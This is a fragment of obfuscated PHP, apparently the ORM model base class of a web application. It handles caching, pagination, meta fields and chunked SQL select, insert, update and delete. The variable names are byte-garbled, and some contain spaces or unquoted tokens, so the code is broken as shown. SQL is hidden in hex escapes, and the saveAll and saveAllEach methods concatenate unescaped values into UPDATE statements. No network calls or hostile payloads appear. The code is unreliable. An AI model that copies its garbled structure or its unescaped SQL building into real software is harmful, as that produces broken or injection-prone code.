return; } if (!$this->checkDataAutoHas($_SERVER[§Êá¸İ][433])) { return; } foreach ($Ïï„³®Î as &$Éğµ¤„) { $this->dataAfterFilter($Éğµ¤„); } unset($Éğµ¤„); } protected function _afterFind(&$•‹÷”Â÷, $‹ÚôıÅ) { if (!is_array($•‹÷”Â÷)) { return; } if (!$this->checkDataAutoHas($_SERVER[§Êá¸İ][433])) { return; } $this->dataAfterFilter($•‹÷”Â÷); } public static function textEncode($¨ã§â‰‡) { if (!$¨ã§â‰‡) { return $¨ã§â‰‡; } $öÔÕé±” = json_encode($¨ã§â‰‡); $öÔÕé±” = preg_replace_callback($_SERVER[§Êá¸İ][434], function ($¢è›ŸÄ) { return addslashes($¢è›ŸÄ[0]); }, $öÔÕé±”); return json_decode($öÔÕé±”); } public static function textDecode($€Ù¬¢åä) { $±Ø„ËîĞ =& $_SERVER[§Êá¸İ]; $îŸîïó = json_encode($€Ù¬¢åä); $îŸîïó = preg_replace_callback($±Ø„ËîĞ[435], function ($‡•©ü) { return $_SERVER[§Êá¸İ][100]; }, $îŸîïó); return json_decode($îŸîïó); } public function setAutoIncrement($Ñ–Š Ìß) { $’”şÁ‹ = array($this->getPk() => $Ñ–Š Ìß); $²µ»Ñêğ = $this->data($’”şÁ‹)->add(); if ($²µ»Ñêğ) { $this->delete($²µ»Ñêğ); } } public function getAutoIncrement() { $ù‚†ïìÌ = $this->getTableName(); $Óö•¤Â® = $this->max($this->getPk()); $°˜­ãç• = $this->query("\x73\x68\x6f\x77\x20\164\x61\142\x6c\145\40\163\164\141\x74\x75\163\40\167\x68\145\162\x65\x20\x4e\x61\x6d\145\x3d\47{$ù‚†ïìÌ}\x27"); $½Ù­ß¯ = $°˜­ãç•[0][$_SERVER[§Êá¸İ][436]]; $‡Á±š„› = max($Óö•¤Â®, $½Ù­ß¯); return $‡Á±š„›; } protected function _callBefore($÷»ˆ», $ÎÅ÷ÛÍ) { return $this->cacheCallCheck($÷»ˆ», $ÎÅ÷ÛÍ, !1); } protected function _callAfter($ûÎşíŒ», $Ç®ÁÕÙâ) { return $this->cacheCallCheck($ûÎşíŒ», $Ç®ÁÕÙâ, !0); } protected function cacheFunctionAlias($“µ¾±úÂ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÁÕ¼†¡ú, $‚‰­×ü, $ò¥á¹¾ë = false) { $ëæğ¾à¦ = $this->cacheFunctionAlias($‚‰­×ü); if (!$ëæğ¾à¦) { return; } foreach ($ëæğ¾à¦ as $áÂÚ÷“™ => $«ÍÏÂ™«) { $”ƒ‹³‘… = $«ÍÏÂ™«[0]; $ºëÛµ¥ = explode($_SERVER[§Êá¸İ][50], $«ÍÏÂ™«[1]); if ($ÁÕ¼†¡ú == $áÂÚ÷“™) { return $this->cacheFunctionGet($áÂÚ÷“™, $”ƒ‹³‘…); } if ($ò¥á¹¾ë && in_array($ÁÕ¼†¡ú, $ºëÛµ¥)) { $this->cacheFunctionClear($áÂÚ÷“™, $”ƒ‹³‘…); } } } public function cacheFunctionGet($‚²õÊ·¼, $¹ÉãÛÌş) { $½¬–Ğ¢Ó = $this->cacheKeyMake($‚²õÊ·¼, $¹ÉãÛÌş); $›¦íö’‡ = Cache::get($½¬–Ğ¢Ó); if (!is_array($›¦íö’‡)) { $›¦íö’‡ = call_user_func_array(array($this, $‚²õÊ·¼), array($¹ÉãÛÌş, !0)); Cache::set($½¬–Ğ¢Ó, $›¦íö’‡); } return $›¦íö’‡; } public function cacheFunctionClear($·ãšğ¢ê, $æÏ†«ˆ—) { $Üì× ÆÆ = $æÏ†«ˆ—; if (!is_array($æÏ†«ˆ—)) { $Üì× ÆÆ = array($æÏ†«ˆ—); } foreach ($Üì× ÆÆ as $¨¿Á¨êª) { $ñë­İéî = $this->cacheKeyMake($·ãšğ¢ê, $¨¿Á¨êª); Cache::remove($ñë­İéî); } } private function cacheKeyMake($ÉĞ¢ø³, $øˆâ×Å‚) { $ÚÔÆÓ =& $_SERVER[§Êá¸İ]; return get_class($this) . $ÚÔÆÓ[11] . $ÉĞ¢ø³ . $ÚÔÆÓ[437] . $øˆâ×Å‚; } protected function selectPageReset() { $åÊµàÁö =& $_SERVER[§Êá¸İ]; if (isset($GLOBALS[$åÊµàÁö[438]])) { return; } $GLOBALS[$åÊµàÁö[438]] = isset($GLOBALS[$åÊµàÁö[7]][$åÊµàÁö[439]]) ? $GLOBALS[$åÊµàÁö[7]][$åÊµàÁö[439]] : !1; $GLOBALS[$åÊµàÁö[440]] = isset($GLOBALS[$åÊµàÁö[7]][$åÊµàÁö[429]]) ? $GLOBALS[$åÊµàÁö[7]][$åÊµàÁö[429]] : !1; $GLOBALS[$åÊµàÁö[7]][$åÊµàÁö[439]] = !1; $GLOBALS[$åÊµàÁö[7]][$åÊµàÁö[429]] = !1; } protected function selectPageRestore() { $‚¿Ú §Æ =& $_SERVER[§Êá¸İ]; if (!isset($GLOBALS[$‚¿Ú §Æ[438]])) { return; } $GLOBALS[$‚¿Ú §Æ[7]][$‚¿Ú §Æ[439]] = $GLOBALS[$‚¿Ú §Æ[438]]; $GLOBALS[$‚¿Ú §Æ[7]][$‚¿Ú §Æ[429]] = $GLOBALS[$‚¿Ú §Æ[440]]; if ($GLOBALS[$‚¿Ú §Æ[7]][$‚¿Ú §Æ[439]] === !1) { unset($GLOBALS[$‚¿Ú §Æ[7]][$‚¿Ú §Æ[439]]); } if ($GLOBALS[$‚¿Ú §Æ[7]][$‚¿Ú §Æ[429]] === !1) { unset($GLOBALS[$‚¿Ú §Æ[7]][$‚¿Ú §Æ[429]]); } unset($GLOBALS[$‚¿Ú §Æ[438]]); unset($GLOBALS[$‚¿Ú §Æ[440]]); } protected function selectPage($¯·ÃŞ’â = 200, $ ‘–œ˜² = 1) { $ñªÃñæ¢ =& $_SERVER[§Êá¸İ]; global $in; $ıŞå¦ì = $this->optionsValue(); $³É‰ÊôÁ = 50000; $¯·ÃŞ’â = isset($in[$ñªÃñæ¢[439]]) && $in[$ñªÃñæ¢[439]] ? $in[$ñªÃñæ¢[439]] : $¯·ÃŞ’â; if ($¯·ÃŞ’â === -1) { $in[$ñªÃñæ¢[439]] = !1; $³É‰ÊôÁ = 100000000; $¯·ÃŞ’â = $³É‰ÊôÁ; } $ÅÌöŸÊâ = $ıŞå¦ì; $ÅÌöŸÊâ[$ñªÃñæ¢[441]] = array(); $¯·ÃŞ’â = intval($¯·ÃŞ’â); $¯·ÃŞ’â = $¯·ÃŞ’â <= 5 ? 5 : ($¯·ÃŞ’â >= $³É‰ÊôÁ ? $³É‰ÊôÁ : $¯·ÃŞ’â); $ ‘–œ˜² = intval(isset($in[$ñªÃñæ¢[429]]) && $in[$ñªÃñæ¢[429]] ? $in[$ñªÃñæ¢[429]] : $ ‘–œ˜²); $ ‘–œ˜² = $ ‘–œ˜² <= 1 ? 1 : $ ‘–œ˜²; $—±ğ»º = array(); $¢İÒíƒè = 1; if ($ ‘–œ˜² == 1 && $¢İÒíƒè) { $this->optionsValue($ıŞå¦ì); $—±ğ»º = $this->page($ ‘–œ˜², $¯·ÃŞ’â)->select(); $íŞÍ‚ƒ½ = is_array($—±ğ»º) ? count($—±ğ»º) : 0; if ($íŞÍ‚ƒ½ < $¯·ÃŞ’â) { $ÔÚüñõ¤ = 1; } else { $this->optionsValue($ÅÌöŸÊâ); $íŞÍ‚ƒ½ = intval($this->count()); $ÔÚüñõ¤ = ceil($íŞÍ‚ƒ½ / $¯·ÃŞ’â); } } else { $this->optionsValue($ÅÌöŸÊâ); $íŞÍ‚ƒ½ = intval($this->count()); $ÔÚüñõ¤ = ceil($íŞÍ‚ƒ½ / $¯·ÃŞ’â); $ ‘–œ˜² = $ ‘–œ˜² >= $ÔÚüñõ¤ ? $ÔÚüñõ¤ : $ ‘–œ˜²; $this->optionsValue($ıŞå¦ì); $—±ğ»º = $this->page($ ‘–œ˜², $¯·ÃŞ’â)->select(); } if (!is_array($—±ğ»º)) { $—±ğ»º = array(); } if ($ÔÚüñõ¤ == 1) { $íŞÍ‚ƒ½ = count($—±ğ»º); } $×©÷ÇßÑ = array($ñªÃñæ¢[442] => array($ñªÃñæ¢[443] => $íŞÍ‚ƒ½, $ñªÃñæ¢[439] => $¯·ÃŞ’â, $ñªÃñæ¢[429] => $ ‘–œ˜², $ñªÃñæ¢[444] => $ÔÚüñõ¤), $ñªÃñæ¢[445] => $—±ğ»º); return $×©÷ÇßÑ; } protected function checkLength($ÔœÁƒÎ, $Å‚¾ß¾Á = 0, $ˆ”‡õÆ = '') { $ÕªêÌú¦ =& $_SERVER[§Êá¸İ]; $Å‚¾ß¾Á = $Å‚¾ß¾Á ? $Å‚¾ß¾Á : 65536; if (!$ÔœÁƒÎ || strlen($ÔœÁƒÎ) < $Å‚¾ß¾Á) { return; } $ˆ”‡õÆ = $ˆ”‡õÆ ? $ˆ”‡õÆ . $ÕªêÌú¦[74] : $ÕªêÌú¦[12]; show_json($ˆ”‡õÆ . LNG($ÕªêÌú¦[446]) . "\50{$Å‚¾ß¾Á}\51", !1); } protected function metaSet($®­‘ÕÂŸ, $¤ìÓ¯¥­ = null, $Åª„ùÙ¤ = null) { $«ôğÌÛı =& $_SERVER[§Êá¸İ]; if (!$this->tableMeta || !$®­‘ÕÂŸ) { return !1; } $Œ±®şç = $this->tableMeta[$«ôğÌÛı[447]]; $ÔÉæ³Óš = $this->tableMeta[$«ôğÌÛı[448]]; $«ıñÅª¬ = Model($ÔÉæ³Óš); $“Òò‡½Ó = array($Œ±®şç => $®­‘ÕÂŸ, $«ôğÌÛı[449] => $¤ìÓ¯¥­); if (is_null($¤ìÓ¯¥­)) { return $«ıñÅª¬->where(array($Œ±®şç => $®­‘ÕÂŸ))->delete(); } if (is_null($Åª„ùÙ¤) && is_string($¤ìÓ¯¥­)) { return $«ıñÅª¬->where($“Òò‡½Ó)->delete(); } $öÌœ¤ßÔ = is_array($¤ìÓ¯¥­) ? $¤ìÓ¯¥­ : array(); if (is_string($¤ìÓ¯¥­)) { $öÌœ¤ßÔ[$¤ìÓ¯¥­] = $Åª„ùÙ¤; } $Îœ„®Ùƒ = array(); foreach ($öÌœ¤ßÔ as $’Ï¶­ı¿ => $ÌÜí—Ñš) { if (is_null($ÌÜí—Ñš) && is_string($’Ï¶­ı¿)) { $«ıñÅª¬->where(array($Œ±®şç => $®­‘ÕÂŸ, $«ôğÌÛı[449] => $’Ï¶­ı¿))->delete(); continue; } $this->checkLength($ÌÜí—Ñš, !1, $ÔÉæ³Óš . $«ôğÌÛı[4] . $’Ï¶­ı¿); $Îœ„®Ùƒ[] = array($Œ±®şç => $®­‘ÕÂŸ, $«ôğÌÛı[97] => $’Ï¶­ı¿, $«ôğÌÛı[450] => $ÌÜí—Ñš); } $äçŞßÊ = $«ôğÌÛı[451] . $ÔÉæ³Óš; CacheLock::lock($äçŞßÊ); $«ıñÅª¬->where(array($Œ±®şç => $®­‘ÕÂŸ))->addAll($Îœ„®Ùƒ, array(), !0); CacheLock::unlock($äçŞßÊ); return !0; } public function metaGet($éôÎïÄš, $õÇ–ı’ = false) { $·ã­¡Ÿ =& $_SERVER[§Êá¸İ]; if (!$this->tableMeta) { return array(); } $ƒ¾Âåş² = $this->tableMeta[$·ã­¡Ÿ[447]]; $Û¼µñ·Ø = Model($this->tableMeta[$·ã­¡Ÿ[448]]); if ($õÇ–ı’) { $Ó…õÈ–‰ = array($ƒ¾Âåş² => $éôÎïÄš, $·ã­¡Ÿ[97] => $õÇ–ı’); return $Û¼µñ·Ø->where($Ó…õÈ–‰)->getField($·ã­¡Ÿ[450]); } $Ó…õÈ–‰ = array($ƒ¾Âåş² => $éôÎïÄš); $—Î¾àª… = $Û¼µñ·Ø->field($·ã­¡Ÿ[452])->where($Ó…õÈ–‰)->select(); $—Î¾àª… = array_to_keyvalue($—Î¾àª…, $·ã­¡Ÿ[97], $·ã­¡Ÿ[450]); return $—Î¾àª…; } private function checkDataAutoHas($û”û«ù‹) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÎšİÀ¤Ï) { if (in_array($û”û«ù‹, explode($_SERVER[§Êá¸İ][50], $ÎšİÀ¤Ï[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$èÁ¹ÒÌ¸, $îœœ“¦õ) { $¹¦Ï˜€ =& $_SERVER[§Êá¸İ]; if (!is_array($èÁ¹ÒÌ¸)) { return; } foreach ($this->dataAuto as $ÅÂÁ»ßê) { $´ü°¨š° = $ÅÂÁ»ßê[0]; if (!in_array($îœœ“¦õ, explode($¹¦Ï˜€[50], $ÅÂÁ»ßê[2]))) { continue; } switch (trim($ÅÂÁ»ßê[3])) { case $¹¦Ï˜€[397]: case $¹¦Ï˜€[398]: $¶ËåİÑÜ = $ÅÂÁ»ßê[1]; $’£ğÁ“è = isset($ÅÂÁ»ßê[4]) ? (array) $ÅÂÁ»ßê[4] : array(); if ($¶ËåİÑÜ == $¹¦Ï˜€[206] && array_key_exists($´ü°¨š°, $èÁ¹ÒÌ¸)) { if (!$èÁ¹ÒÌ¸[$´ü°¨š°]) { unset($èÁ¹ÒÌ¸[$´ü°¨š°]); } break; } if (isset($èÁ¹ÒÌ¸[$´ü°¨š°])) { array_unshift($’£ğÁ“è, $èÁ¹ÒÌ¸[$´ü°¨š°]); } if ($¹¦Ï˜€[397] == $ÅÂÁ»ßê[3]) { $èÁ¹ÒÌ¸[$´ü°¨š°] = call_user_func_array($¶ËåİÑÜ, $’£ğÁ“è); } else { $èÁ¹ÒÌ¸[$´ü°¨š°] = call_user_func_array(array(&$this, $¶ËåİÑÜ), $’£ğÁ“è); } break; case $¹¦Ï˜€[347]: if (isset($èÁ¹ÒÌ¸[$´ü°¨š°]) && $èÁ¹ÒÌ¸[$´ü°¨š°]) { $èÁ¹ÒÌ¸[$´ü°¨š°] = call_user_func_array(array(&$this, $ÅÂÁ»ßê[1]), array($èÁ¹ÒÌ¸[$´ü°¨š°])); } break; case $¹¦Ï˜€[350]: $èÁ¹ÒÌ¸[$´ü°¨š°] = $èÁ¹ÒÌ¸[$ÅÂÁ»ßê[1]]; break; case $¹¦Ï˜€[370]: if (isset($èÁ¹ÒÌ¸[$´ü°¨š°]) && !is_string($èÁ¹ÒÌ¸[$´ü°¨š°])) { $èÁ¹ÒÌ¸[$´ü°¨š°] = json_encode_force($èÁ¹ÒÌ¸[$´ü°¨š°]); } break; case $¹¦Ï˜€[399]: if ($èÁ¹ÒÌ¸[$´ü°¨š°] === $¹¦Ï˜€[12]) { unset($èÁ¹ÒÌ¸[$´ü°¨š°]); } break; case $¹¦Ï˜€[400]: $èÁ¹ÒÌ¸[$´ü°¨š°] = $ÅÂÁ»ßê[1]; default: break; } } if ($îœœ“¦õ == $¹¦Ï˜€[431]) { $ş±©ıã‘ = strtolower($this->db->getDbType()); if (strpos($ş±©ıã‘, $¹¦Ï˜€[13]) !== 0) { return; } $¹ô³íñ¬ = $this->field(!0)->fields; $ÇÌÑ¹€¹ = $¹ô³íñ¬[$¹¦Ï˜€[329]]; if (isset($¹ô³íñ¬[$¹¦Ï˜€[328]])) { unset($ÇÌÑ¹€¹[$¹ô³íñ¬[$¹¦Ï˜€[328]]]); } foreach ($ÇÌÑ¹€¹ as $úö‰§ => $îœœ“¦õ) { if (!isset($èÁ¹ÒÌ¸[$úö‰§])) { $èÁ¹ÒÌ¸[$úö‰§] = $¹¦Ï˜€[12]; } } } } private function dataAfterFilter(&$ãÓºò­È) { $õç±äÜ =& $_SERVER[§Êá¸İ]; foreach ($this->dataAuto as $ÁÑÖ­) { $şãöà·« = $ÁÑÖ­[0]; if (!isset($ãÓºò­È[$şãöà·«])) { continue; } if (!in_array($õç±äÜ[433], explode($õç±äÜ[50], $ÁÑÖ­[2]))) { continue; } switch (trim($ÁÑÖ­[3])) { case $õç±äÜ[397]: case $õç±äÜ[398]: $Úç™Á¥ = isset($ÁÑÖ­[4]) ? (array) $ÁÑÖ­[4] : array(); array_unshift($Úç™Á¥, $ãÓºò­È[$şãöà·«]); if (isset($ÁÑÖ­[4]) && $ÁÑÖ­[4] == $õç±äÜ[453]) { $Úç™Á¥ = array($ãÓºò­È[$şãöà·«]); } if ($õç±äÜ[397] == $ÁÑÖ­[3]) { $ãÓºò­È[$şãöà·«] = call_user_func_array($ÁÑÖ­[1], $Úç™Á¥); } else { $ãÓºò­È[$şãöà·«] = call_user_func_array(array(&$this, $ÁÑÖ­[1]), $Úç™Á¥); } break; case $õç±äÜ[347]: if (isset($ãÓºò­È[$şãöà·«]) && $ãÓºò­È[$şãöà·«]) { $ãÓºò­È[$şãöà·«] = call_user_func_array(array(&$this, $ÁÑÖ­[1]), array($ãÓºò­È[$şãöà·«])); } break; case $õç±äÜ[350]: $ãÓºò­È[$şãöà·«] = $ãÓºò­È[$ÁÑÖ­[1]]; break; case $õç±äÜ[370]: $«Ï‘Û´± = $ãÓºò­È[$şãöà·«]; $ãÓºò­È[$şãöà·«] = json_decode($«Ï‘Û´±, !0); if (is_null($ãÓºò­È[$şãöà·«])) { $ãÓºò­È[$şãöà·«] = $«Ï‘Û´±; } break; case $õç±äÜ[399]: if ($ãÓºò­È[$şãöà·«] === $õç±äÜ[12]) { unset($ãÓºò­È[$şãöà·«]); } break; case $õç±äÜ[400]: $ãÓºò­È[$şãöà·«] = $ÁÑÖ­[1]; break; default: break; } } } public function saveAll($°ü¬ÇïÍ) { $ôìïÁ¼ =& $_SERVER[§Êá¸İ]; $…¹ªƒÍ = $this->tablePrefix . $this->tableName; $ã¥‡Îñ§ = self::SQL_WHERE_IN_CHUNK; $°ü¬ÇïÍ = is_array($°ü¬ÇïÍ) ? $°ü¬ÇïÍ : array(); $ÓñŒ³“ = $ôìïÁ¼[454]; $ê¬Ø»Ææ = 0; $ïá±‰÷ = array(); $‘÷¨øáô = count($°ü¬ÇïÍ); for ($‰Ã½éæØ = 0; $‰Ã½éæØ < $‘÷¨øáô; $‰Ã½éæØ++) { $ŸúÖ‡ÓÅ = $°ü¬ÇïÍ[$‰Ã½éæØ]; if (!is_array($ŸúÖ‡ÓÅ) || count($ŸúÖ‡ÓÅ) != 4) { continue; } $íç­ßÅ¨ = "\125\120\x44\101\124\105\x20\x60{$…¹ªƒÍ}\140\40\123\105\124\x20{$ŸúÖ‡ÓÅ[2]}\40\x3d\x20\103\101\123\x45\40{$ŸúÖ‡ÓÅ[0]}\40\xa"; if ($ê¬Ø»Ææ == 0) { $ÓñŒ³“ = $íç­ßÅ¨; } $ïá±‰÷[] = $ôìïÁ¼[121] . $ŸúÖ‡ÓÅ[1] . $ôìïÁ¼[121]; $ê¬Ø»Ææ++; $ÓñŒ³“ .= "\x20\127\110\105\x4e\x20\x27{$ŸúÖ‡ÓÅ[1]}\47\x20\124\x48\x45\116\x20\x27{$ŸúÖ‡ÓÅ[3]}\x27\40\xa"; if ($ê¬Ø»Ææ == $ã¥‡Îñ§ || $‰Ã½éæØ == $‘÷¨øáô - 1) { $¸¹µíä = implode($ôìïÁ¼[50], $ïá±‰÷); $ÓñŒ³“ .= "\x20\x45\x4e\x44\x20\40\127\x48\105\122\105\x20{$ŸúÖ‡ÓÅ[0]}\40\x49\116\x20\x28{$¸¹µíä}\x29\x20"; $this->execute($ÓñŒ³“); $ê¬Ø»Ææ = 0; $ÓñŒ³“ = $íç­ßÅ¨; $this->chunkEventCheck(count($ïá±‰÷)); $ïá±‰÷ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‡‡ô­šİ) { $ìÓ„ŠÁ˜ =& $_SERVER[§Êá¸İ]; $âºÁÎˆ¹ = $this->tablePrefix . $this->tableName; foreach ($‡‡ô­šİ as $™Â´ïÔ²) { if (!is_array($™Â´ïÔ²) || count($™Â´ïÔ²) != 4) { continue; } $é¯”½Ô¿ = $™Â´ïÔ²[0] . $ìÓ„ŠÁ˜[455] . $™Â´ïÔ²[1] . $ìÓ„ŠÁ˜[121]; $éâ¬­æº = $™Â´ïÔ²[2] . $ìÓ„ŠÁ˜[455] . $™Â´ïÔ²[3] . $ìÓ„ŠÁ˜[121]; $Áæ°¨ø¬ = "\x75\160\144\141\x74\145\x20{$âºÁÎˆ¹}\x20\163\145\164\40{$éâ¬­æº}\40\167\150\x65\x72\x65\x20{$é¯”½Ô¿}\x3b"; $this->execute($Áæ°¨ø¬); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($è®àñú™ = false, $ÛÀåÃšÚ = false) { $this->_chunkEvent = $è®àñú™; $this->_chunkEventParam = $ÛÀåÃšÚ; } private function chunkEventCheck($õ²·Çé) { if (!$this->_chunkEvent) { return; } $µøÈìû— = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $µøÈìû—[$_SERVER[§Êá¸İ][456]] = $õ²·Çé; Hook::trigger($this->_chunkEvent, $µøÈìû—); } public function addAll($Šœ®õÓ˜, $§ˆÔ…¹² = array(), $·ÌÖ™¡Á = false) { $Ã²ãé´ë =& $_SERVER[§Êá¸İ]; ignore_timeout(); $Ã¯ö£¤ = self::SQL_WHERE_IN_CHUNK; if (empty($Šœ®õÓ˜)) { $this->error = think_lang($Ã²ãé´ë[348]); return !1; } $§ˆÔ…¹² = $this->_parseOptions($§ˆÔ…¹²); foreach ($Šœ®õÓ˜ as $ïíãÒğ => $Ä¨Ğö—¾) { $Šœ®õÓ˜[$ïíãÒğ] = $this->_facade($Ä¨Ğö—¾); $this->_beforeInsert($Šœ®õÓ˜[$ïíãÒğ], $§ˆÔ…¹²); } if (method_exists($this->db, $Ã²ãé´ë[349])) { for ($Ø”ğ•Şä = 0; $Ø”ğ•Şä < count($Šœ®õÓ˜); $Ø”ğ•Şä += $Ã¯ö£¤) { $Şâûˆèæ = array_slice($Šœ®õÓ˜, $Ø”ğ•Şä, $Ã¯ö£¤); if (!is_array($Şâûˆèæ) || count($Şâûˆèæ) == 0) { break; } $µŞ£Åí½ = $this->db->insertAll($Şâûˆèæ, $§ˆÔ…¹², $·ÌÖ™¡Á); $this->chunkEventCheck(count($Şâûˆèæ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Šœ®õÓ˜ as $ïíãÒğ => $Ä¨Ğö—¾) { $µŞ£Åí½ = $this->db->insert($Ä¨Ğö—¾, $§ˆÔ…¹², $·ÌÖ™¡Á); } $this->commit(); } if (!1 !== $µŞ£Åí½) { $İÜ§ä¹ö = $this->getLastInsID(); if ($İÜ§ä¹ö) { return $İÜ§ä¹ö; } } return $µŞ£Åí½; } public function save($´ïÄÖÜì = '', $«Ò“ú´¦ = array()) { $ûÒÓ–¥Û =& $_SERVER[§Êá¸İ]; $ÔÕ¨‡æİ = self::SQL_WHERE_IN_CHUNK; $»ì¢æõ± = $this->optionsValue(); $õ§Ë¢µ½ = $this->findWhereField($»ì¢æõ±); if (!$õ§Ë¢µ½) { return parent::save($´ïÄÖÜì, $«Ò“ú´¦); } $í”Àª–Ä = 0; $‰­ùÃØ = $»ì¢æõ±[$ûÒÓ–¥Û[352]][$õ§Ë¢µ½][1]; $‰­ùÃØ = is_array($‰­ùÃØ) ? $‰­ùÃØ : array(); $ÏÊÄö£ = count($‰­ùÃØ); for ($Â×“Ô‹È = 0; $Â×“Ô‹È < $ÏÊÄö£; $Â×“Ô‹È += $ÔÕ¨‡æİ) { $ºêá”Õı = array_slice($‰­ùÃØ, $Â×“Ô‹È, $ÔÕ¨‡æİ); if (!is_array($ºêá”Õı) || count($ºêá”Õı) == 0) { break; } $»ì¢æõ±[$ûÒÓ–¥Û[352]][$õ§Ë¢µ½][1] = $ºêá”Õı; $this->optionsValue($»ì¢æõ±); $í”Àª–Ä += parent::save($´ïÄÖÜì, $«Ò“ú´¦); $this->chunkEventCheck(count($ºêá”Õı)); } $this->chunkEventSet(); return $í”Àª–Ä; } public function add($®ªåî¢ = '', $¥à¼›°² = array(), $òòÌÕç = false) { if ($this->addTaskStatus && is_array($®ªåî¢)) { $this->addTaskData[] = $®ªåî¢; return; } return parent::add($®ªåî¢, $¥à¼›°², $òòÌÕç); } public function parseWhereLike($Å˜Ç·ä›, $åàìíœ = '', $˜ñè«ƒ = false, &$ş–¿íÖ® = false) { $ÕËóÂÏÖ =& $_SERVER[§Êá¸İ]; $í·Íİñ‡ = $GLOBALS[$ÕËóÂÏÖ[6]][$ÕËóÂÏÖ[457]]; if (!$í·Íİñ‡[$ÕËóÂÏÖ[458]]) { return $Å˜Ç·ä›; } if (!is_array($Å˜Ç·ä›)) { return $Å˜Ç·ä›; } $ñ‡Ä†¤à = array(); $áÍ·ô®á = 0; foreach ($Å˜Ç·ä› as $áºùÌ¡ => $‡ŒìÄ¢†) { if (is_array($‡ŒìÄ¢†) && count($‡ŒìÄ¢†) == 2 && $‡ŒìÄ¢†[0] == $ÕËóÂÏÖ[459] && is_string($‡ŒìÄ¢†[1]) && substr($‡ŒìÄ¢†[1], 0, 1) == $ÕËóÂÏÖ[460] && substr($‡ŒìÄ¢†[1], strlen($‡ŒìÄ¢†[1]) - 1, 1) == $ÕËóÂÏÖ[460]) { $ş–¿íÖ® = !0; $€ãç¦” = is_string($áºùÌ¡) ? $áºùÌ¡ : $åàìíœ; $¨­¦¥Ø— = substr($‡ŒìÄ¢†[1], 1, strlen($‡ŒìÄ¢†[1]) - 2); $¨­¦¥Ø— = $this->db->escapeString($¨­¦¥Ø—); if (!strpos($€ãç¦”, $ÕËóÂÏÖ[10])) { $€ãç¦” = $ÕËóÂÏÖ[461] . $€ãç¦” . $ÕËóÂÏÖ[461]; } $ü©ùÂšË = $ÕËóÂÏÖ[220] . $¨­¦¥Ø— . $ÕËóÂÏÖ[220]; $¨­¦¥Ø— = str_replace(array($ÕËóÂÏÖ[10], $ÕËóÂÏÖ[462], $ÕËóÂÏÖ[11]), $ÕËóÂÏÖ[463], $¨­¦¥Ø—); if ($í·Íİñ‡[$ÕËóÂÏÖ[464]]) { $ü©ùÂšË = $ÕËóÂÏÖ[465] . $¨­¦¥Ø— . $ÕËóÂÏÖ[466]; if ($í·Íİñ‡[$ÕËóÂÏÖ[467]]) { $ü©ùÂšË = $ÕËóÂÏÖ[466] . $¨­¦¥Ø— . $ÕËóÂÏÖ[465]; } } $ñ‡Ä†¤à[$áÍ·ô®á] = $ÕËóÂÏÖ[468] . $€ãç¦” . $ÕËóÂÏÖ[469] . $ü©ùÂšË . $ÕËóÂÏÖ[470]; $áÍ·ô®á++; continue; } if (is_array($‡ŒìÄ¢†)) { $åàìíœ = is_string($áºùÌ¡) ? $áºùÌ¡ : $åàìíœ; $‡ŒìÄ¢† = $this->parseWhereLike($‡ŒìÄ¢†, $åàìíœ, !0, $ş–¿íÖ®); } if (is_numeric($áºùÌ¡)) { $ñ‡Ä†¤à[$áÍ·ô®á] = $‡ŒìÄ¢†; $áÍ·ô®á++; } else { $ñ‡Ä†¤à[$áºùÌ¡] = $‡ŒìÄ¢†; } } if ($ş–¿íÖ® && !$˜ñè«ƒ) { } return $ñ‡Ä†¤à; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($’Ñ¾‹í = array()) { $È©¥ÒÓ =& $_SERVER[§Êá¸İ]; $šØ¡“û½ = self::SQL_WHERE_IN_CHUNK; $Õõ°âÒ˜ = $this->optionsValue(); $åıµÌÂ• = $this->findWhereField($Õõ°âÒ˜); if (!$åıµÌÂ• || isset($Õõ°âÒ˜[$È©¥ÒÓ[368]]) || isset($Õõ°âÒ˜[$È©¥ÒÓ[429]])) { return parent::select($’Ñ¾‹í); } $½¦­¿ßİ = $Õõ°âÒ˜[$È©¥ÒÓ[352]][$åıµÌÂ•][1]; $½¦­¿ßİ = is_array($½¦­¿ßİ) ? $½¦­¿ßİ : array(); $¢Ç¨äŒó = null; for ($¨‹ËŒ¯ƒ = 0; $¨‹ËŒ¯ƒ < count($½¦­¿ßİ); $¨‹ËŒ¯ƒ += $šØ¡“û½) { $§…‹Š«ê = array_slice($½¦­¿ßİ, $¨‹ËŒ¯ƒ, $šØ¡“û½); if (!is_array($§…‹Š«ê) || count($§…‹Š«ê) == 0) { break; } $Õõ°âÒ˜[$È©¥ÒÓ[352]][$åıµÌÂ•][1] = $§…‹Š«ê; $this->optionsValue($Õõ°âÒ˜); $ÁÈÊöØª = parent::select($’Ñ¾‹í); if (!$ÁÈÊöØª) { continue; } $¢Ç¨äŒó = is_array($¢Ç¨äŒó) ? $¢Ç¨äŒó : array(); $¢Ç¨äŒó = array_merge($¢Ç¨äŒó, $ÁÈÊöØª); } return $¢Ç¨äŒó; } public function delete($İÀ¾¥°ı = array()) { $ªÅØÄğû =& $_SERVER[§Êá¸İ]; $ë —ª½¨ = self::SQL_WHERE_IN_CHUNK; $¿¬Ìì×ª = $this->optionsValue(); $¨‰öŠ×Ñ = $this->findWhereField($¿¬Ìì×ª); if (!$¨‰öŠ×Ñ) { return parent::delete($İÀ¾¥°ı); } $¼‚±Ÿª = 0; $ãøŞÒ‚µ = $¿¬Ìì×ª[$ªÅØÄğû[352]][$¨‰öŠ×Ñ][1]; $ãøŞÒ‚µ = is_array($ãøŞÒ‚µ) ? $ãøŞÒ‚µ : array(); for ($ÁËØ—Ô¸ = 0; $ÁËØ—Ô¸ < count($ãøŞÒ‚µ); $ÁËØ—Ô¸ += $ë —ª½¨) { $Æ¿Ì‡Ë = array_slice($ãøŞÒ‚µ, $ÁËØ—Ô¸, $ë —ª½¨); if (!is_array($Æ¿Ì‡Ë) || count($Æ¿Ì‡Ë) == 0) { break; } 